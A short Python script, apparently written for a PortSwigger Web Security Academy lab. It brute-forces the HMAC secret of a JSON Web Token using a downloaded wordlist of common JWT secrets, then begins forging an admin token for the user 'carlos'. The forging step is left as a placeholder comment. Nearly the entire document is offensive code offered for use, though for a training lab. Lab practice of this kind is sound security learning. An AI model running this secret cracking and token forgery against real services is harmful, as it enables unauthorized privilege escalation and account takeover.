import requests, base64, hmac, hashlib, json

jwt = "eyJraWQiOiIwOTg0MzBhMS1iOGI4LTQxNWEtYjZhNi0zYzczZTA5OGUyZTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5Mzg0Mjc4MSwic3ViIjoid2llbmVyIn0.z0WJz4TLasLJ1hSGj2ChlsVJJKi7L41VdDj96KujCEU"

parts = jwt.split('.')
header_b64, payload_b64, sig_b64 = parts[0], parts[1], parts[2]

# Descodificar header para confirmar algoritmo
def decode_b64url(s):
    s += '=' * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

header = decode_b64url(header_b64)
print(f"Algoritmo: {header['alg']}")

# Wordlist
wordlist = requests.get("https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list").text.split('\n')

print("Force bruting...")
for secret in wordlist:
    secret = secret.strip()
    if not secret: continue

    # Calcular firma HMAC-SHA256 CORRECTA
    signing_input = f"{header_b64}.{payload_b64}"
    calculated_sig = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    ).rstrip(b'=').decode()

    # Si la firma calculada coincide con la del token original...
    if calculated_sig == sig_b64:
        print(f"✅ SECRETO ENCONTRADO: '{secret}'")

        # Ahora genera token admin
        admin_payload = {"username": "carlos", "admin": True, "role": "admin"}
        # ... (resto para generar y probar token admin)
        break
